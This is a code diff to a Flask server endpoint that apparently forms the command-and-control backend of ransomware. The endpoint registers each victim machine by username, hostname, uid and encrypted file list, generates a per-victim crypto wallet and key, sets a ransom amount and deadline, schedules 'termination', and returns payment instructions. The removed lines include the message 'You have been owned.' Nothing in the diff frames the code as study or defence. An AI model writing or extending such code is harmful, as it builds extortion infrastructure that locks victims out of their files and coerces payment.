@@ -13,6 +13,7 @@ from datetime import timedelta
 from utilities.wallet_api import gen_wallet
 from utilities.deadline import format_date
 from utilities.instructions import instruct
+from utilities.random_str import secure_string
 
 
 @app.route("/new-user", methods=["POST"])
@@ -29,7 +30,7 @@ def new_user():
         if not data:
             return jsonify({"error": "No data provided."}), 400
 
-        required_keys = ["username", "hostname", "uid", "os", "version", "architecture", "email", "files"]
+        required_keys = ["username", "hostname", "uid", "files"]
         if not all(key in data for key in required_keys):
             return jsonify({"error": "Missing required parameters."}), 400
 
@@ -47,15 +48,13 @@ def new_user():
             payment = 50
 
         wallet = gen_wallet(sanitized_data.get("uid"))
-        print(f"wallet info: {wallet}")
+        password = secure_string(32)
 
         user = Users(
             username=sanitized_data.get("username"),
             hostname=sanitized_data.get("hostname"),
+            password=password,
             uid=sanitized_data.get("uid"),
-            os_name=sanitized_data.get("os"),
-            os_version=sanitized_data.get("version"),
-            os_architecture=sanitized_data.get("architecture"),
             email=sanitized_data.get("email"),
             ip_address=user_ip,
             public_key=keys[1],
@@ -90,17 +89,12 @@ def new_user():
             return jsonify({"error": "Database error"}), 400
 
         schedule_termination(user.id, expiration_date)
+        instructions = instruct(str(payment), format_date(expiration_date), wallet["wallet_address"], sanitized_data.get("files"))
 
         return jsonify({
-            "message": "User and keys added successfully.",
-            "user_data": {
-                "payment_amount": str(payment),
-                "deadline": format_date(expiration_date),
-                "wallet_address": wallet["wallet_address"],
-                "public_key": keys[1],
-                "instructions": instruct,
-                "message": "You have been owned."
-            }
+            "message": "success",
+            "public_key": keys[1],
+            "data": instructions
         }), 201
 
     except Exception as e:
